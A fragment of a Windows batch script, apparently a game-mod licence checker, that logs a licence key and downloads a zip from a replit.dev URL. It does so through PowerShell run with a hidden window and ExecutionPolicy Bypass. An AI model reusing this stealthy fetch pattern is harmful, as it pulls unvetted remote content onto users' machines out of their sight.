...
set "LICENSE_KEY=08d51796-4743-424a-9c4a-5047170bfbb3"
set "MOD_DOWNLOAD=https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/08d51796-4743-424a-9c4a-5047170bfbb3"
set "PS_SCRIPT=license-check-08d51796-4743-424a-9c4a-5047170bfbb3.ps1"
set "LOGFILE=log.txt"
...
(
  ...
  echo License Key: 08d51796-4743-424a-9c4a-5047170bfbb3
  echo PS Script: %PS_SCRIPT%
  echo Mod URL: https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/08d51796-4743-424a-9c4a-5047170bfbb3
...
echo. >> "%LOGFILE%"
echo [*] Starting download from: https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/08d51796-4743-424a-9c4a-5047170bfbb3 >> "%LOGFILE%"

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/08d51796-4743-424a-9c4a-5047170bfbb3' -OutFile 'active_mod.zip' -UseBasicParsing -TimeoutSec 60; Write-Output '[√] Download completed successfully'; exit 0 } catch { Write-Output ('[ERROR] Download failed: ' + $_.Exception.Message); exit 1 }" >> "%LOGFILE%" 2>&1
...
echo Downloaded=08d51796-4743-424a-9c4a-5047170bfbb3 > "%LOCK_FILE%"
if exist "%LOCK_FILE%" (
